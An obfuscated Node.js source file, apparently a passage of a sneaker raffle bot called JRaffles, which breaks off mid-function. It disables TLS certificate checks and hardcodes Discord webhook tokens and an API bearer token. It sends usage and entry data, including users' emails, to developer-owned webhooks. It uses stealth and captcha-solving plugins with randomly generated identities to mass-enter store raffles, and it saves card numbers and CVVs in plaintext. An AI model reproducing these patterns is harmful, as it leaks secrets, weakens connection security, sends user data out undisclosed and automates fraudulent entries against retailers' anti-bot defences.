process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x457b0a = require('fs'), _0x5f5207 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x3b293b(_0x408505) {
    const _0x21a1fc = _0x457b0a['createWriteStream'](_0x408505, { 'flags': 'a' }), _0xbc07cc = console['log'];
    console['log'] = function () {
        const _0x15eeb2 = Array['prototype']['slice']['call'](arguments), _0x582a42 = _0x15eeb2['join']('\x20') + '\x0a';
        _0x21a1fc['write'](_0x582a42), _0xbc07cc['apply'](console, _0x15eeb2);
    };
}
_0x3b293b('../logs/log\x20' + _0x5f5207);
var _0x55f1ec = require('tough-cookie'), _0x517e1b = require('node-imap'), _0xed87a2 = require('util')['inspect'];
const _0xa13a33 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x2e7f4a } = require('discord.js');
var _0x4b1b19 = require('exe');
const { execFile: _0x11c419 } = require('child_process'), _0x2926d5 = require('puppeteer-extra'), _0x1a23f2 = require('cross-spawn'), _0x4a68ab = require('puppeteer-extra-plugin-recaptcha'), _0x409c7d = require('puppeteer-extra-plugin-stealth'), _0x1ac777 = require('chalk'), _0x25b0b6 = require('node-bash-title'), _0x500c10 = require('axios'), _0x1b57da = require('papaparse');
var _0x4b3228 = require('random-name');
const _0x2a2e1d = require('request');
var _0x4bf4a7 = require('prompt');
const _0x426561 = _0x2a2e1d['jar']();
var _0x79d23a = {};
const _0x2c0caa = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x25a3bb = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x338670 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x51dae0 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x5bd31b = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x50033f = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x325aae = 'https://discord.com/api/webhooks/', _0x112aef = '' + _0x325aae + _0x338670, _0x534fd1 = '' + _0x325aae + _0x51dae0, _0x59432e = '' + _0x325aae + _0x2c0caa, _0x34ab86 = '' + _0x325aae + _0x25a3bb, _0x1d7baa = '' + _0x325aae + _0x5bd31b, _0x1df144 = '' + _0x325aae + _0x50033f;
const _0x12cea3 = JSON['parse'](_0x457b0a['readFileSync']('../package.json', 'utf-8')), _0x492c9c = _0x12cea3['version'];
var _0x273bbf, _0x11770e, _0x31796e, _0x4b8def, _0x2336f2, _0x323fa2, _0x2e53d0, _0x1f316b;
const _0x486808 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x85f0b1 = ![];
const _0x2004a4 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x2a1a60 = '0123456789';
var _0x3b320e = _0x2004a4['split']('');
const _0x5a20bf = require('auto-git-update'), _0x5a690a = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x2e6e9d = new _0x5a20bf(_0x5a690a);
async function _0x4f45a9() {
    _0x2336f2 = _0x457b0a['readdirSync']('../proxies'), _0x4b8def = _0x457b0a['readdirSync']('../tasks'), !_0x457b0a['existsSync']('../accounts/fenom.csv') && _0x457b0a['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x457b0a['existsSync']('../accounts/paypal.csv') && _0x457b0a['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x457b0a['existsSync']('../accounts/bstn.csv') && _0x457b0a['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x457b0a['existsSync']('../accounts/eql.csv') && _0x457b0a['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x457b0a['existsSync']('../failed-tasks.csv') && _0x457b0a['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x457b0a['existsSync']('../successful-tasks.csv') && _0x457b0a['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x79d23a = JSON['parse'](_0x457b0a['readFileSync']('../settings.json', 'utf-8')), !_0x79d23a['delay'] && (_0x79d23a['delay'] = 0x3c, _0x457b0a['writeFileSync']('../settings.json', JSON['stringify'](_0x79d23a, null, 0x2))), !_0x79d23a['threads'] && (_0x79d23a['threads'] = 0x1, _0x457b0a['writeFileSync']('../settings.json', JSON['stringify'](_0x79d23a, null, 0x2))), !_0x79d23a['python'] && (_0x1a23f2('start', [
        'cmd',
        '/k',
        'py\x20-m\x20pip\x20install\x20-r\x20modules/Confirmed/requirements.txt'
    ], { 'shell': !![] }), _0x1a23f2('start', [
        'cmd',
        '/k',
        'py\x20-m\x20pip\x20install\x20git+https://github.com/66niko99/py-adyen-encrypt.git'
    ], { 'shell': !![] }), _0x79d23a['python'] = 'uptodate', _0x457b0a['writeFileSync']('../settings.json', JSON['stringify'](_0x79d23a, null, 0x2))), !_0x79d23a['masterMail'] && (_0x79d23a['masterMail'] = 'yourmail@gmail.com', _0x457b0a['writeFileSync']('../settings.json', JSON['stringify'](_0x79d23a, null, 0x2))), !_0x79d23a['CapSolver'] && (_0x79d23a['CapSolver'] = 'yourkeyhere', _0x457b0a['writeFileSync']('../settings.json', JSON['stringify'](_0x79d23a, null, 0x2))), !_0x79d23a['masterPassword'] && (_0x79d23a['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x457b0a['writeFileSync']('../settings.json', JSON['stringify'](_0x79d23a, null, 0x2))), !_0x79d23a['captchaKey'] && (_0x79d23a['captchaKey'] = '', _0x457b0a['writeFileSync']('../settings.json', JSON['stringify'](_0x79d23a, null, 0x2))), !_0x79d23a['useRandomProxy'] && (_0x79d23a['useRandomProxy'] = !![], _0x457b0a['writeFileSync']('../settings.json', JSON['stringify'](_0x79d23a, null, 0x2))), !_0x79d23a['shuffleTasks'] && (_0x79d23a['shuffleTasks'] = ![], _0x457b0a['writeFileSync']('../settings.json', JSON['stringify'](_0x79d23a, null, 0x2))), !_0x79d23a['webhook'] && (_0x79d23a['webhook'] = '', _0x457b0a['writeFileSync']('../settings.json', JSON['stringify'](_0x79d23a, null, 0x2))), _0x79d23a['delay'] <= 0x1388 && (_0x79d23a['delay'] = _0x79d23a['delay'] * 0x3e8), _0x79d23a['AfewDelay'] && (delete _0x79d23a['AfewDelay'], _0x457b0a['writeFileSync']('../settings.json', JSON['stringify'](_0x79d23a, null, 0x2))), _0x79d23a['MahaDelay'] && (delete _0x79d23a['MahaDelay'], _0x457b0a['writeFileSync']('../settings.json', JSON['stringify'](_0x79d23a, null, 0x2))), _0x79d23a['footshopDelay'] && (delete _0x79d23a['footshopDelay'], _0x457b0a['writeFileSync']('../settings.json', JSON['stringify'](_0x79d23a, null, 0x2))), _0x79d23a['MahaDelay'] = _0x79d23a['delay'], _0x325aae = _0x79d23a['webhook'], _0x323fa2 = _0x79d23a['licenseKey'];
}
let _0x22d1ad, _0x376d4d = [], _0x2b4ece;
const _0x289b0b = _0x2189c3 => new Promise(_0x47857e => setTimeout(_0x47857e, _0x2189c3));
function _0xa85770(_0x429c30, _0x557aec) {
    return Math['floor'](Math['random']() * (_0x557aec - _0x429c30 + 0x1) + _0x429c30);
}
function _0x463df8(_0x4bb9b7) {
    let _0x580273 = _0x4bb9b7['length'], _0x1ff089;
    while (_0x580273 != 0x0) {
        _0x1ff089 = Math['floor'](Math['random']() * _0x580273), _0x580273--, [_0x4bb9b7[_0x580273], _0x4bb9b7[_0x1ff089]] = [
            _0x4bb9b7[_0x1ff089],
            _0x4bb9b7[_0x580273]
        ];
    }
    return _0x4bb9b7;
}
async function _0x6b2118(_0x39fa09) {
    try {
        return _0x500c10['post']('https://api.whop.com/api/v2/memberships/' + _0x39fa09 + '/validate_license', { 'metadata': { 'key': '' } }, {
            'headers': {
                'Authorization': 'Bearer\x20DRT4qDTPjhk0dbWMnuTDrMuGiUh6MogGpjZL6gSDoLU',
                'Content-Type': 'application/json'
            }
        });
    } catch (_0x1eda29) {
        console['log']('Error\x20checking\x20license:\x20' + _0x1eda29['message']);
    }
}
async function _0x39ef7e(_0x38b086) {
    console['clear']();
    if (_0x38b086 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x46d0ed = await _0x4bf4a7['get']('License');
        if (_0x46d0ed['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x289b0b(0xbb8), _0x39ef7e(_0x38b086);
        _0x38b086 = _0x46d0ed['License'], _0x79d23a['licenseKey'] = _0x38b086, _0x323fa2 = _0x38b086, _0x457b0a['writeFileSync']('../settings.json', JSON['stringify'](_0x79d23a));
    }
    console['log']('Checking\x20license\x20' + _0x323fa2 + '...'), await _0x289b0b(0x320);
    const _0x8dbf95 = await _0x6b2118(_0x38b086);
    _0x2e53d0 = JSON['stringify'](_0x8dbf95['data']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x1f316b = JSON['stringify'](_0x8dbf95['data']['discord']['image_url'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x8dbf95)
        return console['log']('License\x20not\x20found');
    if (!_0x8dbf95['data'])
        return console['log']('License\x20not\x20bound');
    return _0x8dbf95['data']['valid'] ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x85f0b1 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x85f0b1 = ![]);
}
async function _0x2a2ef6() {
    var _0x5670b9 = await _0x4bf4a7['get']('Module');
    return console['clear'](), _0x5670b9['Module'];
}
;
async function _0x580dbe() {
    var _0xe2d0c2 = await _0x4bf4a7['get']('Setting');
    return console['clear'](), _0xe2d0c2['Setting'];
}
async function _0x4119b0(_0x3dabb1) {
    var _0x5656ce = [];
    for (file of _0x4b8def) {
        var _0x13b905 = _0x457b0a['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x1b57da['parse'](_0x13b905, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x3dabb1['store'] && _0x5656ce['push'](file);
    }
    !_0x5656ce['length'] == 0x0 && (_0x4b8def = _0x5656ce);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x2600e2 = 0x0; _0x2600e2 < _0x4b8def['length']; _0x2600e2++) {
        console['log']('\x20(' + _0x2600e2 + ')\x20' + _0x4b8def[_0x2600e2]);
    }
    console['log']('');
    var _0x356c0d = await _0x4bf4a7['get']('Task');
    if (_0x356c0d['Task'] > _0x4b8def['length'] - 0x1 || isNaN(_0x356c0d['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x289b0b(0x3e8), _0x4119b0();
    var _0x3df995 = _0x457b0a['readFileSync']('../tasks/' + _0x4b8def[_0x356c0d['Task']], 'utf-8');
    return _0x31796e = _0x1b57da['parse'](_0x3df995, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x1ac777['blue'](_0x4b8def[_0x356c0d['Task']])), _0x273bbf = _0x4b8def[_0x356c0d['Task']], _0x31796e;
}
async function _0x1082d0() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x3f2ee4 = 0x0; _0x3f2ee4 < _0x2336f2['length']; _0x3f2ee4++) {
        console['log']('\x20(' + _0x3f2ee4 + ')\x20' + _0x2336f2[_0x3f2ee4]);
    }
    console['log']('');
    var _0x1c65ea = await _0x4bf4a7['get']('Proxies');
    if (_0x1c65ea['Proxies'] > _0x2336f2['length'] - 0x1 || isNaN(_0x1c65ea['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x289b0b(0x3e8), _0x1082d0();
    var _0x1a7e56 = _0x457b0a['readFileSync']('../proxies/' + _0x2336f2[_0x1c65ea['Proxies']], 'utf-8')['split']('\x0a');
    let _0x2c6f6 = _0x1a7e56['map']((_0x4a2d21, _0x4072d9) => {
        sanatizeProxy = _0x4a2d21['replace']('\x0d', '');
        if (_0x1a7e56[_0x4072d9 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x11770e = _0x2336f2[_0x1c65ea['Proxies']], console['clear'](), _0x2c6f6;
}
async function _0xd512a2() {
    var _0x4331fb = await _0x4bf4a7['get']('Value');
    return console['clear'](), _0x4331fb['Value'];
}
async function _0x123f37(_0xc7043) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x5cc979 = 0x0; _0x5cc979 < _0xc7043['length']; _0x5cc979++) {
        console['log']('\x20(' + _0x5cc979 + ')\x20[' + _0xc7043[_0x5cc979]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x269cae = await _0x4bf4a7['get']('Module');
    return _0x269cae['Module'];
}
async function _0x2672c8() {
    var _0x195ef9 = await _0x4bf4a7['get']('Password');
    return console['clear'](), _0x195ef9['Password'];
}
;
async function _0x11d24c() {
    var _0x2306fb = await _0x4bf4a7['get']('Links');
    return _0x2306fb['Links'];
}
;
async function _0x13c8b1() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x3d2fd3 = 0x0; _0x3d2fd3 < _0x376d4d['length']; _0x3d2fd3++) {
        console['log']('\x20(' + _0x3d2fd3 + ')\x20' + _0x376d4d[_0x3d2fd3]);
    }
    ;
    console['log']();
    let _0x369841 = await _0x4bf4a7['get']('Product');
    return console['clear'](), _0x369841['Product'];
}
;
function _0x3d201d() {
    var _0x401c33 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x401c33;
}
;
function _0x466c2a() {
    var _0x2becbe = new Date(Date['now']())['toLocaleString']();
    return _0x2becbe['replace'](',', '');
}
async function _0x15c654(_0x298471, _0x354f6b) {
    let _0x2dac18 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x492c9c != 'devkey') {
        await _0x500c10['post'](_0x298471, _0x354f6b, _0x2dac18);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x117512(_0x436297, _0x2bfd23, _0x4db889, _0x489382, _0x4add9f) {
    if (!_0x489382 && _0x4db889 == 'dev') {
        var _0x50fd64 = new _0x2e7f4a()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x2bfd23['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x2bfd23['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x436297['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x79d23a['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x2e53d0,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x436297['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x436297['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x492c9c,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x50fd64['data'];
    } else {
        if (_0x489382 && _0x4db889 == 'dev') {
            var _0x50fd64 = new _0x2e7f4a()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x2bfd23['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x2e53d0,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x2bfd23['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x436297['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x79d23a['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x4add9f,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x436297['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x436297['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x492c9c,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x50fd64['data'];
        } else {
            if (_0x4db889 == 'pub') {
                var _0x50fd64 = new _0x2e7f4a()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x2bfd23['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x2bfd23['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x436297['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x79d23a['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x436297['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x492c9c,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x50fd64['data'];
            } else {
                if (_0x4db889 == 'acc' && !_0x489382) {
                    var _0x50fd64 = new _0x2e7f4a()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x2bfd23['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x2e53d0,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x2bfd23['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x79d23a['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x492c9c,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x50fd64['data'];
                } else {
                    if (_0x4db889 == 'acc' && _0x489382) {
                        var _0x50fd64 = new _0x2e7f4a()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x2bfd23['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x2e53d0,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x4add9f,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x2bfd23['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x79d23a['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x492c9c,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x50fd64['data'];
                    } else {
                        if (_0x4db889 == 'open') {
                            var _0x50fd64 = new _0x2e7f4a()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x1f316b)['addFields']({
                                'name': 'User',
                                'value': '' + _0x2e53d0,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x492c9c,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x50fd64['data'];
                        } else {
                            if (!_0x489382 && _0x4db889 == 'ver') {
                                var _0x50fd64 = new _0x2e7f4a()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x2bfd23['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x2e53d0,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x2bfd23['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x79d23a['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x492c9c,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x50fd64['data'];
                            } else {
                                if (_0x489382 && _0x4db889 == 'ver') {
                                    var _0x50fd64 = new _0x2e7f4a()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x2bfd23['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x2e53d0,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x4add9f,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x2bfd23['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x79d23a['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x492c9c,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x50fd64['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x5af4d5(_0x5baadb, _0x5b81bf) {
    var _0x313d59 = _0x5baadb[_0x5b81bf]['Address1']['split'](''), _0x25f0d9 = _0x5baadb[_0x5b81bf]['Address2']['split'](''), _0x46eb51 = _0x5baadb[_0x5b81bf]['Email']['split']('@');
    for (var _0x5550d9 = 0x0; _0x5550d9 < _0x313d59['length']; _0x5550d9++) {
        if (_0x313d59[_0x5550d9] == 'X') {
            var _0x4dcf1a = Math['round'](Math['random']() * (_0x2004a4['length'] - 0x1));
            _0x313d59[_0x5550d9] = _0x3b320e[_0x4dcf1a];
        }
    }
    ;
    for (var _0x5550d9 = 0x0; _0x5550d9 < _0x25f0d9['length']; _0x5550d9++) {
        if (_0x25f0d9[_0x5550d9] == 'X') {
            var _0x4dcf1a = Math['round'](Math['random']() * (_0x2004a4['length'] - 0x1));
            _0x25f0d9[_0x5550d9] = _0x3b320e[_0x4dcf1a];
        }
    }
    ;
    _0x5baadb[_0x5b81bf]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x5baadb[_0x5b81bf]['FirstName'] = _0x4b3228['first']());
    _0x5baadb[_0x5b81bf]['LastName']['toUpperCase']() == 'RANDOM' && (_0x5baadb[_0x5b81bf]['LastName'] = _0x4b3228['last']());
    _0x46eb51[0x0]['toUpperCase']() == 'RANDOM' ? _0x46eb51[0x0] = '' + _0x4b3228['first']() + _0x4b3228['last']() + _0xa85770(0x1, 0x3e7) + '@' : _0x46eb51[0x0] = _0x46eb51[0x0] + '@';
    _0x5baadb[_0x5b81bf]['Email'] = _0x46eb51['join'](''), _0x5baadb[_0x5b81bf]['Address1'] = _0x313d59['join'](''), _0x5baadb[_0x5b81bf]['Address2'] = _0x25f0d9['join']('');
    _0x5baadb[_0x5b81bf]['Phone'] == 'RANDOM' && (_0x5baadb[_0x5b81bf]['Phone'] = '0' + _0xa85770(0x5f5e100, 0x3b9ac9ff));
    if (_0x5baadb[_0x5b81bf]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x191830 = _0xa85770(0x1, 0x270f);
        _0x5baadb[_0x5b81bf]['Follower'] = '' + _0x4b3228['first']() + _0x4b3228['last']() + _0x191830 + '\x20';
    }
    _0x5baadb[_0x5b81bf]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x5baadb[_0x5b81bf]['HouseNumber'] = _0xa85770(0x1, 0xc8));
    if (_0x5baadb[_0x5b81bf]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x25b948 = Math['round'](Math['random']() * (_0x2004a4['length'] - 0x1)), _0x921b27 = _0x3b320e[_0x25b948];
        _0x5baadb[_0x5b81bf]['Address1'] = _0x4b3228['last']() + 'straat', _0x5baadb[_0x5b81bf]['Zip'] == '' && (_0x5baadb[_0x5b81bf]['Postcode'] = _0xa85770(0x3e8, 0x270f) + '\x20' + _0x921b27 + _0x921b27, _0x5baadb[_0x5b81bf]['Zip'] = _0x5baadb[_0x5b81bf]['Postcode']), _0x5baadb[_0x5b81bf]['HouseNumber'] = '' + _0xa85770(0x1, 0xc8);
    }
    return;
}
;
async function _0x5f4429(_0x10bd2b, _0x289503) {
    _0x457b0a['appendFileSync']('../failed-tasks.csv', _0x466c2a() + ',' + _0x289503['store'] + ',' + _0x289503['name'] + ',' + _0x10bd2b['Url'] + ',' + _0x10bd2b['Size'] + ',' + _0x10bd2b['Follower'] + ',' + _0x10bd2b['FirstName'] + ',' + _0x10bd2b['LastName'] + ',' + _0x10bd2b['Address1'] + ',' + _0x10bd2b['Address2'] + ',' + _0x10bd2b['HouseNumber'] + ',' + _0x10bd2b['Zip'] + ',' + _0x10bd2b['City'] + ',' + _0x10bd2b['State'] + ',' + _0x10bd2b['Country'] + ',' + _0x10bd2b['Phone'] + ',' + _0x10bd2b['Email'] + ',' + _0x10bd2b['Password'] + ',' + _0x10bd2b['PaymentMethod'] + ',' + _0x10bd2b['CardType'] + ',' + _0x10bd2b['NameOnCard'] + ',' + _0x10bd2b['CardNumber'] + ',' + _0x10bd2b['ExpiryDate'] + ',' + _0x10bd2b['CVV'] + ',' + _0x10bd2b['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x53c50d(_0x2a00fa, _0x502f08) {
    _0x457b0a['appendFileSync']('../successful-tasks.csv', _0x466c2a() + ',' + _0x502f08['store'] + ',' + _0x502f08['name'] + ',' + _0x2a00fa['Url'] + ',' + _0x2a00fa['Size'] + ',' + _0x2a00fa['Follower'] + ',' + _0x2a00fa['FirstName'] + ',' + _0x2a00fa['LastName'] + ',' + _0x2a00fa['Address1'] + ',' + _0x2a00fa['Address2'] + ',' + _0x2a00fa['HouseNumber'] + ',' + _0x2a00fa['Zip'] + ',' + _0x2a00fa['City'] + ',' + _0x2a00fa['State'] + ',' + _0x2a00fa['Country'] + ',' + _0x2a00fa['Phone'] + ',' + _0x2a00fa['Email'] + ',' + _0x2a00fa['Password'] + ',' + _0x2a00fa['PaymentMethod'] + ',' + _0x2a00fa['CardType'] + ',' + _0x2a00fa['NameOnCard'] + ',' + _0x2a00fa['CardNumber'] + ',' + _0x2a00fa['ExpiryDate'] + ',' + _0x2a00fa['CVV'] + ',' + _0x2a00fa['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x142db8() {
    let _0x517d58 = proxyFile['split']('\x0a'), _0x1f6b2b = _0x517d58['map']((_0x3354ef, _0x5abc44) => {
        sanatizeProxy = _0x3354ef['replace']('\x0d', '');
        if (_0x517d58[_0x5abc44 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x1f6b2b;
}
;
async function _0x3c9b5a(_0x4511b6, _0x518414) {
    if (_0x35c0b5 != 'yes')
